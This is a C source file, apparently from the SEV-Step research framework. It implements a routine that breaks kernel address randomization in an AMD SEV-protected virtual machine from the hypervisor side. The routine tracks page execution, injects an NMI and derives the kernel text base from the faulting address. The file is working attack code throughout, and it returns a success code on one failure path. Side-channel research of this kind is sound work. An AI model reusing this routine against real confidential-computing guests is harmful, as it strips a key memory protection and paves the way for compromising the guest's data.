#include "sev_step_routines.h"
#include "ansi-color-codes.h"
#include "sev_step_api.h"
#include "sev_step_print_macros.h"

#include <stdbool.h>
#include <stdio.h>

int break_kaslr_via_nmi(uint64_t asm_exc_nmi_offset ,uint64_t* kernel_text_base_gpa, bool debug_mode,
    uint64_t* kernel_text_base_vaddr) {

    int exit_code = SEV_STEP_OK;
    usp_event_type_t event_type;
    void* event_buffer = NULL;

    usp_poll_api_ctx_t ctx;
    bool api_open = false;
    printf("Initializing API...\n");
    if(SEV_STEP_ERR == usp_new_ctx(&ctx,debug_mode)) {
        printf("%s:%d usp_new_ctx" BHRED "FAILED." reset " Check dmesg for more information\n"
            ,__FILE__,__LINE__);
        return SEV_STEP_OK;
    }
    printf("API initialization done!\n");
    api_open = true;

    //
    // Algorithm:
    // 1) Track all pages and wait untill vm is paused
    // 2) Inject NMI
    // 3) Retrack pages
    // 4) continue vm and store next pf
    //


    //track all pages
    printf("Tracking all pages...\n");
    if( SEV_STEP_OK != track_all_pages(&ctx,KVM_PAGE_TRACK_EXEC)) {
        printf("%s:%d track_all_pages:" BHRED" FAILED\n"reset,__FILE__,__LINE__);
        exit_code = SEV_STEP_ERR;
        goto cleanup;
    }

    printf("Waiting for random page fault to pause VM...\n");
    if( SEV_STEP_ERR == usp_block_until_event(&ctx,&event_type,&event_buffer)) {
        printf("%s:%d usp_block_until_event: " BHRED "FAILED"reset,__FILE__,__LINE__);
        exit_code = SEV_STEP_ERR;
        goto cleanup;
    }

    printf("Got random page fault. Injecting nmi...\n");

    if( SEV_STEP_ERR == inject_nmi(&ctx) ) {
        printf("%s:%d inject_nmi: " BHRED "FAILED"reset,__FILE__,__LINE__);
        exit_code = SEV_STEP_ERR;
        goto cleanup;
    }

    printf("Re-tracking...\n");
    if( SEV_STEP_OK != track_all_pages(&ctx,KVM_PAGE_TRACK_EXEC)) {
        printf("%s:%d track_all_pages: " BHRED "FAILED\n"reset,__FILE__,__LINE__);
        exit_code = SEV_STEP_ERR;
        goto cleanup;
    }
    
    printf("Acking event..\n");
    free_usp_event(event_type,event_buffer);
    event_buffer = NULL;
    usp_ack_event(&ctx);


    printf("Waiting for first pf after nmi injection...\n");
    if( SEV_STEP_ERR == usp_block_until_event(&ctx,&event_type,&event_buffer)) {
        printf("%s:%d usp_block_until_event:  " BHRED "FAILED"reset,__FILE__,__LINE__);
        exit_code = SEV_STEP_ERR;
        goto cleanup;
    }

    if( event_type != PAGE_FAULT_EVENT ) {
        printf("%s:%d : expected page fault event, got %d\n",__FILE__,__LINE__,event_type);
        exit_code = SEV_STEP_ERR;
        goto cleanup;
    }
    usp_page_fault_event_t* pf_event = (usp_page_fault_event_t*)event_buffer;
    printf(BHGRN "Pagefault Event: {GPA:0x%lx}\n"reset,pf_event->faulted_gpa);

    if( debug_mode ) {
        if( !pf_event->is_decrypted_vmsa_data_valid ) {
            printf("%s:%d requested debug mode but vmsa data ist invalid\n",__FILE__,__LINE__);
            exit_code = SEV_STEP_ERR;
            goto cleanup;
        }
        printf(BHGRN "RIP: 0x%lx\n"reset,pf_event->decrypted_vmsa_data.register_values[VRN_RIP]);

    }


    printf("Acking event..\n");
    usp_ack_event(&ctx);


    printf("Closing API...\n");
    if(SEV_STEP_ERR == usp_close_ctx(&ctx)) {
        printf(BRED "usp_close_ctx failed." reset " Check dmesg for more information\n");
        exit_code = SEV_STEP_ERR;
        api_open = false;
        goto cleanup;
    } else {
        printf("API closed!\n");
    }
    api_open = false;

    *kernel_text_base_gpa = (pf_event->faulted_gpa & ~0xfff) - asm_exc_nmi_offset;
    if( debug_mode ) {
        if( kernel_text_base_vaddr == NULL ) {
            flf_printf("debug_mode requested but kernel_text_base_vaddr param was NULL\n");
            exit_code = SEV_STEP_ERR;
            goto cleanup;
        }
        *kernel_text_base_vaddr = (pf_event->decrypted_vmsa_data.register_values[VRN_RIP] & ~ 0xfff ) - asm_exc_nmi_offset;
    }

cleanup:
    if( api_open ) {
        printf("Closing API...\n");
        if(SEV_STEP_ERR == usp_close_ctx(&ctx)) {
        printf( BRED "usp_close_ctx failed." reset " Check dmesg for more information\n");
        exit_code = SEV_STEP_ERR;
        } else {
        printf("API closed!\n");
        }
    }

    if(event_buffer != NULL ) {
        free_usp_event(event_type,event_buffer);
    }

    return exit_code;

}
 